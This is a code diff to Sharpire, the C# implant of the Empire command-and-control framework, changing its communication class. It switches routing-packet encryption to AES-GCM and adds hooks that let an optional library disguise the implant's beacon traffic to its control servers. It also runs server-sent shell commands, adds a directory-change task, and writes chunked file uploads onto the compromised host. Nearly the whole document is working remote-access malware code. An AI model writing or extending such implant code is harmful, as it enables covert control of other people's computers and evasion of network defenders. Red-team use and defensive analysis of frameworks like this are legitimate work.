@@ -9,7 +9,7 @@ using System.Reflection;
 using System.Text;
 using System.Threading;
 using System.Security.Cryptography;
-using ChaChaEncryption;
+using AesGcmEncryption;
 
 namespace Sharpire
 {
@@ -21,28 +21,26 @@ Defines packet types, builds tasking packets and parses result packets.
 
 Packet format:
 
-Nonce: Nonce used by ChaCha20Poly1305
-ChaCha20Poly1305(Routing Data): Encrypted RoutingData with associated Poly1305 tag
+Nonce: Nonce used by AES-GCM
+AES-GCM(Routing Data): Encrypted RoutingData with associated GCM tag
 AESc = AES encrypted using the client's session key
-ChaCha20(RoutingData): Encrypted RoutingData
-Poly1305(RoutingData): Poly1305 tag of RoutingData
 
 
     Routing Packet:
-    +---------+--------------------------------+--------------------------+
-    |  Nonce  | ChaCha20+Poly1305(RoutingData) | AESc(client packet data) | ...
-    +---------+--------------------------------+--------------------------+
-    |    12   |                32              |          length          |
-    +---------+--------------------------------+--------------------------+
+    +---------+---------------------------+--------------------------+
+    |  Nonce  |  AES-GCM(RoutingData)     | AESc(client packet data) | ...
+    +---------+---------------------------+--------------------------+
+    |    12   |             32            |          length          |
+    +---------+---------------------------+--------------------------+
 
-        ChaCha20+Poly1305(RoutingData):
+        AES-GCM(RoutingData):
         +---------------------------+---------------------------+
-        |   ChaCha20(RoutingData)   |   Poly1305(RoutingData)   |
+        |   AES-GCM Ciphertext      |       AES-GCM Tag         |
         +---------------------------+---------------------------+
         |           16              |            16             |
         +---------------------------+---------------------------+
 
-            ChaCha20(RoutingData):
+            RoutingData (plaintext):
             +-----------+------+------+-------+--------+
             | SessionID | Lang | Meta | Extra | Length |
             +-----------+------+------+-------+--------+
@@ -59,7 +57,7 @@ Poly1305(RoutingData): Poly1305 tag of RoutingData
     +--------+-----------------+-------+
     | AES IV | Enc Packet Data | HMACc |
     +--------+-----------------+-------+
-    |   16   |   % 16 bytes    |  10   |
+    |   16   |   % 16 bytes    |  16   |
     +--------+-----------------+-------+
 
     Client data decrypted:
@@ -82,7 +80,10 @@ Poly1305(RoutingData): Poly1305 tag of RoutingData
             [X...]     - tasking data
 
 */
-    class Coms
+    // Partial so the optional SharpireMalleable source library can extend it
+    // with malleable-profile-aware request handling without the base build
+    // referencing any malleable types.
+    partial class Coms
     {
         public SessionInfo sessionInfo;
 
@@ -98,32 +99,30 @@ Poly1305(RoutingData): Poly1305 tag of RoutingData
 
         private byte[] NewRoutingPacket(byte[] encryptedBytes, int meta)
         /*
-        Constructs a routing packet with chacha20poly1305 encryption.
-        
+        Constructs a routing packet with AES-GCM encryption.
+
         Packet format:
 
-        Nonce: Nonce used by ChaCha20Poly1305
-        ChaCha20Poly1305(Routing Data): Encrypted RoutingData with associated Poly1305 tag
+        Nonce: Nonce used by AES-GCM
+        AES-GCM(Routing Data): Encrypted RoutingData with associated GCM tag
         AESc = AES encrypted using the client's session key
-        ChaCha20(RoutingData): Encrypted RoutingData
-        Poly1305(RoutingData): Poly1305 tag of RoutingData
 
 
             Routing Packet:
-            +---------+--------------------------------+--------------------------+
-            |  Nonce  | ChaCha20+Poly1305(RoutingData) | AESc(client packet data) | ...
-            +---------+--------------------------------+--------------------------+
-            |    12   |                32              |          length          |
-            +---------+--------------------------------+--------------------------+
+            +---------+---------------------------+--------------------------+
+            |  Nonce  |  AES-GCM(RoutingData)     | AESc(client packet data) | ...
+            +---------+---------------------------+--------------------------+
+            |    12   |             32            |          length          |
+            +---------+---------------------------+--------------------------+
 
-                ChaCha20+Poly1305(RoutingData):
+                AES-GCM(RoutingData):
                 +---------------------------+---------------------------+
-                |   ChaCha20(RoutingData)   |   Poly1305(RoutingData)   |
+                |   AES-GCM Ciphertext      |       AES-GCM Tag         |
                 +---------------------------+---------------------------+
                 |           16              |            16             |
                 +---------------------------+---------------------------+
 
-                    RoutingData:
+                    RoutingData (plaintext):
                     +-----------+------+------+-------+--------+
                     | SessionID | Lang | Meta | Extra | Length |
                     +-----------+------+------+-------+--------+
@@ -150,15 +149,15 @@ Poly1305(RoutingData): Poly1305 tag of RoutingData
             data = Misc.combine(data, new byte[4] { lang, Convert.ToByte(meta), 0x00, 0x00 });
             data = Misc.combine(data, BitConverter.GetBytes(encryptedBytesLength));
 
-            //encrypt the routingData with chacha20 and create an associated poly1305 tag
-            byte[] chacha_data = new byte[16];
-            byte[] poly1305_tag = new byte[16];
-            byte[] chacha_nonce = NewInitializationVector(nonce_length);
-            ChaCha20Poly1305.Encrypt(sessionInfo.GetStagingKeyBytes(), chacha_nonce, data, out chacha_data, out poly1305_tag);
+            //encrypt the routingData with AES-GCM
+            byte[] gcm_ciphertext = new byte[16];
+            byte[] gcm_tag = new byte[16];
+            byte[] gcm_nonce = NewInitializationVector(nonce_length);
+            AesGcm.Encrypt(sessionInfo.GetStagingKeyBytes(), gcm_nonce, data, out gcm_ciphertext, out gcm_tag);
 
-            //combine the nonce + chacha20 encrypted data + poly1305 tag + encryptedBytes (if applicable) into the routingPacketData bytearray
-            byte[] routingPacketData = Misc.combine(chacha_nonce, chacha_data);
-            routingPacketData = Misc.combine(routingPacketData, poly1305_tag);
+            //combine the nonce + AES-GCM ciphertext + GCM tag + encryptedBytes (if applicable) into the routingPacketData bytearray
+            byte[] routingPacketData = Misc.combine(gcm_nonce, gcm_ciphertext);
+            routingPacketData = Misc.combine(routingPacketData, gcm_tag);
             if (encryptedBytes != null && encryptedBytes.Length > 0)
             {
                 routingPacketData = Misc.combine(routingPacketData, encryptedBytes);
@@ -169,32 +168,30 @@ Poly1305(RoutingData): Poly1305 tag of RoutingData
 
         internal void DecodeRoutingPacket(byte[] packetData, ref JobTracking jobTracking)
         /*
-        Decodes a chacha20poly1305 encrypted routing packet to a normal routing packet
-        
+        Decodes an AES-GCM encrypted routing packet to a normal routing packet
+
         Packet format:
 
-        Nonce: Nonce used by ChaCha20Poly1305
-        ChaCha20Poly1305(Routing Data): Encrypted RoutingData with associated Poly1305 tag
+        Nonce: Nonce used by AES-GCM
+        AES-GCM(Routing Data): Encrypted RoutingData with associated GCM tag
         AESc = AES encrypted using the client's session key
-        ChaCha20(RoutingData): Encrypted RoutingData
-        Poly1305(RoutingData): Poly1305 tag of RoutingData
 
 
             Routing Packet:
-            +---------+--------------------------------+--------------------------+
-            |  Nonce  | ChaCha20+Poly1305(RoutingData) | AESc(client packet data) | ...
-            +---------+--------------------------------+--------------------------+
-            |    12   |                32              |          length          |
-            +---------+--------------------------------+--------------------------+
+            +---------+---------------------------+--------------------------+
+            |  Nonce  |  AES-GCM(RoutingData)     | AESc(client packet data) | ...
+            +---------+---------------------------+--------------------------+
+            |    12   |             32            |          length          |
+            +---------+---------------------------+--------------------------+
 
-                ChaCha20+Poly1305(RoutingData):
+                AES-GCM(RoutingData):
                 +---------------------------+---------------------------+
-                |   ChaCha20(RoutingData)   |   Poly1305(RoutingData)   |
+                |   AES-GCM Ciphertext      |       AES-GCM Tag         |
                 +---------------------------+---------------------------+
                 |           16              |            16             |
                 +---------------------------+---------------------------+
 
-                    RoutingData:
+                    RoutingData (plaintext):
                     +-----------+------+------+-------+--------+
                     | SessionID | Lang | Meta | Extra | Length |
                     +-----------+------+------+-------+--------+
@@ -209,10 +206,10 @@ Poly1305(RoutingData): Poly1305 tag of RoutingData
         {
             this.jobTracking = jobTracking;
 
-            // define packet structure for ChaCha20Poly1305 (12 byte nonce + 32 bytes for encrypted data and tag. Together is 40 byte header before AESc)
+            // define packet structure for AES-GCM (12 byte nonce + 32 bytes for encrypted data and tag. Together is 44 byte header before AESc)
             int nonce_length = 12;
-            int chacha_header_length = nonce_length + 32;
-            if (packetData.Length < chacha_header_length)
+            int gcm_header_length = nonce_length + 32;
+            if (packetData.Length < gcm_header_length)
             {
                 return;
             }
@@ -222,17 +219,17 @@ Poly1305(RoutingData): Poly1305 tag of RoutingData
             while (offset < packetData.Length)
             {
 
-                //parse out the routingPacket to the chachaNonce and routingChaChaData (Chacha20 encrypted + Poly1305 tag)
-                byte[] routingPacket = packetData.Skip(offset).Take(chacha_header_length).ToArray();
-                byte[] chachaNonce = routingPacket.Take(nonce_length).ToArray();
-                byte[] routingChachaData = packetData.Skip(nonce_length).Take(32).ToArray();
-                offset += chacha_header_length; // advance the offset past the chacha20poly1305 routing packet data (to AESc)
+                //parse out the routingPacket to the gcmNonce and routingGcmData (AES-GCM ciphertext + GCM tag)
+                byte[] routingPacket = packetData.Skip(offset).Take(gcm_header_length).ToArray();
+                byte[] gcmNonce = routingPacket.Take(nonce_length).ToArray();
+                byte[] routingGcmData = packetData.Skip(nonce_length).Take(32).ToArray();
+                offset += gcm_header_length; // advance the offset past the AES-GCM routing packet data (to AESc)
 
-                // decrypt and verify chacha20poly1305 data into output routingData (output decrypted routingpacket)
-                byte[] chachaData = routingChachaData.Take(16).ToArray();
-                byte[] poly1305Tag = routingChachaData.Skip(16).Take(16).ToArray();
+                // decrypt and verify AES-GCM data into output routingData (output decrypted routingpacket)
+                byte[] gcmCiphertext = routingGcmData.Take(16).ToArray();
+                byte[] gcmTag = routingGcmData.Skip(16).Take(16).ToArray();
                 byte[] routingData = new byte[16];
-                ChaCha20Poly1305.Decrypt(sessionInfo.GetStagingKeyBytes(), chachaNonce, chachaData, poly1305Tag, out routingData);
+                AesGcm.Decrypt(sessionInfo.GetStagingKeyBytes(), gcmNonce, gcmCiphertext, gcmTag, out routingData);
 
                 // parse/handle the decrypted routingpacket
                 string packetSessionId = Encoding.UTF8.GetString(routingData.Take(8).ToArray());
@@ -261,10 +258,30 @@ Poly1305(RoutingData): Poly1305 tag of RoutingData
 
         internal byte[] GetTask()
         {
+            byte[] routingPacket = NewRoutingPacket(null, 4);
+
+            // Malleable hook: the SharpireMalleable source library (optional)
+            // implements TryMalleableGet to drive this request via a runtime
+            // profile. Without that library, the partial method is a no-op,
+            // handled stays false, and we fall through to the legacy cookie
+            // path below.
+            byte[] malleableResult = null;
+            bool malleableUsed = false;
+            TryMalleableGet(routingPacket, ref malleableResult, ref malleableUsed);
+            if (malleableUsed)
+            {
+                if (malleableResult == null) return null;
+                string mStr = System.Text.Encoding.UTF8.GetString(malleableResult);
+                if (mStr.TrimStart().StartsWith("<!DOCTYPE", StringComparison.OrdinalIgnoreCase))
+                {
+                    return null;
+                }
+                return malleableResult;
+            }
+
             byte[] results = new byte[0];
             try
             {
-                byte[] routingPacket = NewRoutingPacket(null, 4);
                 string routingCookie = Convert.ToBase64String(routingPacket);
 
                 WebClient webClient = new WebClient();
@@ -299,6 +316,13 @@ Poly1305(RoutingData): Poly1305 tag of RoutingData
             byte[] encryptedBytes = EmpireStager.AesEncryptThenHmac(sessionInfo.GetSessionKeyBytes(), packets);
             byte[] routingPacket = NewRoutingPacket(encryptedBytes, 5);
 
+            // Malleable hook (see GetTask). No-op when SharpireMalleable isn't
+            // compiled in; when it is, the extension returns handled=true after
+            // issuing the profile-driven POST.
+            bool malleableUsed = false;
+            TryMalleableSend(routingPacket, ref malleableUsed);
+            if (malleableUsed) return;
+
             Random random = new Random();
             string controlServer = sessionInfo.GetControlServers()[random.Next(sessionInfo.GetControlServers().Length)];
 
@@ -319,12 +343,67 @@ Poly1305(RoutingData): Poly1305 tag of RoutingData
 
         }
 
+        // Hook implemented by SharpireMalleable/Empire.Agent.Malleable.cs
+        // when the malleable source library is compiled in. Returns via `ref
+        // handled` whether the request was taken over by the malleable
+        // pipeline; `responseBytes` carries the response on success (or null
+        // on a handled-but-failed request). If SharpireMalleable isn't
+        // compiled in, the partial method is a no-op — handled stays false
+        // and the caller falls back to the legacy cookie path.
+        partial void TryMalleableGet(byte[] routingPacket, ref byte[] responseBytes, ref bool handled);
+
+        // Counterpart for POST task-result uploads. Same no-op-when-absent
+        // semantics as TryMalleableGet.
+        partial void TryMalleableSend(byte[] routingPacket, ref bool handled);
+
         private void ProcessTaskingPackets(byte[] encryptedTask)
         {
             byte[] taskingBytes = EmpireStager.AesDecryptAndVerify(sessionInfo.GetSessionKeyBytes(), encryptedTask);
-            PACKET firstPacket = DecodePacket(taskingBytes, 0);
-            byte[] resultPackets = ProcessTasking(firstPacket);
-            SendMessage(resultPackets);
+
+            // The server concatenates queued tasks into one encrypted blob;
+            // each inner frame is a 12-byte header plus payload.
+            const int HEADER_SIZE = 12;
+            int offset = 0;
+            byte[] resultPackets = new byte[0];
+            while (offset < taskingBytes.Length)
+            {
+                if (taskingBytes.Length - offset < HEADER_SIZE)
+                {
+                    resultPackets = Misc.combine(resultPackets, EncodePacket(0, "[!] tasking decode failed: trailing bytes shorter than frame header", 0));
+                    break;
+                }
+                long advance;
+                PACKET packet;
+                try
+                {
+                    packet = DecodePacket(taskingBytes, offset);
+                    // packet.length is uint32 from the wire; cast via long so a
+                    // hostile value can't sign-extend negative and walk offset
+                    // backwards into an infinite re-decode loop.
+                    advance = HEADER_SIZE + (long)packet.length;
+                    if (packet.length > int.MaxValue || offset + advance > taskingBytes.Length)
+                    {
+                        resultPackets = Misc.combine(resultPackets, EncodePacket(0, "[!] tasking decode failed: frame length out of range", packet.taskId));
+                        break;
+                    }
+                    byte[] packetResult = ProcessTasking(packet);
+                    if (packetResult != null && packetResult.Length > 0)
+                    {
+                        resultPackets = Misc.combine(resultPackets, packetResult);
+                    }
+                }
+                catch (Exception error)
+                {
+                    resultPackets = Misc.combine(resultPackets, EncodePacket(0, "[!] tasking decode failed: " + error.Message, 0));
+                    break;
+                }
+                offset += (int)advance;
+            }
+
+            if (resultPackets.Length > 0)
+            {
+                SendMessage(resultPackets);
+            }
         }
 
         private byte[] ProcessTasking(PACKET packet)
@@ -366,21 +445,19 @@ Poly1305(RoutingData): Poly1305 tag of RoutingData
                         Environment.Exit(0);
                         return new byte[0];
                     case 40:
-                        string[] parts = packet.data.Split(' ');
                         string output;
-                        if (parts[0] == "Set-Delay")
+                        // Set-Delay piggybacks on TASK_SHELL for back-compat with the legacy server
+                        // tasking that didn't have a dedicated opcode for it.
+                        string[] parts = packet.data.Split(' ');
+                        if (parts.Length >= 3 && parts[0] == "Set-Delay")
                         {
                             sessionInfo.SetDefaultDelay(UInt32.Parse(parts[1]));
                             sessionInfo.SetDefaultJitter(UInt32.Parse(parts[2]));
                             output = "Delay set to " + parts[1] + " Jitter set to " + parts[2];
                         }
-                        else if (1 == parts.Length)
-                        {
-                            output = Agent.InvokeShellCommand(parts.FirstOrDefault(), "");
-                        }
                         else
                         {
-                            output = Agent.InvokeShellCommand(parts.FirstOrDefault(), string.Join(" ", parts.Skip(1).Take(parts.Length - 1).ToArray()));
+                            output = Agent.InvokeShellCommand(packet.data);
                         }
                         byte[] packetBytes = EncodePacket(packet.type, output, packet.taskId);
                         jobTracking.jobs[taskId.ToString()].Status = "completed";
@@ -393,6 +470,18 @@ Poly1305(RoutingData): Poly1305 tag of RoutingData
                         return Task42(packet);
                     case 43:
                         return Task43(packet);
+                    case 44:
+                        try
+                        {
+                            string newCwd = Agent.ChangeDirectory(packet.data);
+                            jobTracking.jobs[taskId.ToString()].Status = "completed";
+                            return EncodePacket(44, newCwd, packet.taskId);
+                        }
+                        catch (Exception chdirError)
+                        {
+                            jobTracking.jobs[taskId.ToString()].Status = "error";
+                            return EncodePacket(0, "[!] chdir failed: " + chdirError.Message, packet.taskId);
+                        }
                     case 50:
                         jobTracking.jobs[taskId.ToString()].Status = "completed";
                         return GenerateRunningJobsTable(packet);
@@ -484,10 +573,9 @@ Poly1305(RoutingData): Poly1305 tag of RoutingData
             packetStruct.packetNumber = BitConverter.ToUInt16(packet, 4 + offset);
             packetStruct.taskId = BitConverter.ToUInt16(packet, 6 + offset);
             packetStruct.length = BitConverter.ToUInt32(packet, 8 + offset);
-            int takeLength = 12 + (int)packetStruct.length + offset - 1;
-            byte[] dataBytes = packet.Skip(12 + offset).Take(takeLength).ToArray();
+            int dataLength = (int)packetStruct.length;
+            byte[] dataBytes = packet.Skip(12 + offset).Take(dataLength).ToArray();
             packetStruct.data = Encoding.UTF8.GetString(dataBytes);
-            byte[] remainingBytes = packet.Skip(takeLength).Take(packet.Length - takeLength).ToArray();
             packet = null;
             return packetStruct;
         }
@@ -591,12 +679,27 @@ Poly1305(RoutingData): Poly1305 tag of RoutingData
 
         private byte[] Task42(PACKET packet)
         {
-            string[] parts = packet.data.Split('|');
+            string[] parts = packet.data.Split(new[] { '|' }, 4);
             if (2 > parts.Length)
                 return EncodePacket(packet.type, "[!] Upload failed - No Delimiter", packet.taskId);
 
-            string fileName = parts.First();
-            string base64Part = parts[1];
+            int chunkIndex;
+            int totalChunks;
+            string fileName;
+            string base64Part;
+
+            if (parts.Length == 4 && int.TryParse(parts[0], out chunkIndex) && int.TryParse(parts[1], out totalChunks))
+            {
+                fileName = parts[2];
+                base64Part = parts[3];
+            }
+            else
+            {
+                chunkIndex = 0;
+                totalChunks = 1;
+                fileName = parts[0];
+                base64Part = parts[1];
+            }
 
             byte[] content;
             try
@@ -610,25 +713,21 @@ Poly1305(RoutingData): Poly1305 tag of RoutingData
 
             try
             {
-                using (FileStream fileStream = File.Open(fileName, FileMode.Create))
+                FileMode mode = (chunkIndex == 0) ? FileMode.Create : FileMode.Append;
+                using (FileStream fileStream = File.Open(fileName, mode))
                 {
                     using (BinaryWriter binaryWriter = new BinaryWriter(fileStream))
                     {
-                        try
-                        {
-                            binaryWriter.Write(content);
-                            return EncodePacket(packet.type, "[*] Upload of " + fileName + " successful", packet.taskId);
-                        }
-                        catch
-                        {
-                            return EncodePacket(packet.type, "[!] Error in writing file during upload", packet.taskId);
-                        }
+                        binaryWriter.Write(content);
+                        return EncodePacket(packet.type,
+                            "[*] Upload of " + fileName + " successful (chunk " + (chunkIndex + 1) + "/" + totalChunks + ")",
+                            packet.taskId);
                     }
                 }
             }
-            catch
+            catch (Exception ex)
             {
-                return EncodePacket(packet.type, "[!] Error in writing file during upload", packet.taskId);
+                return EncodePacket(packet.type, "[!] Error in writing file " + fileName + " during upload: " + ex.Message, packet.taskId);
             }
         }
 
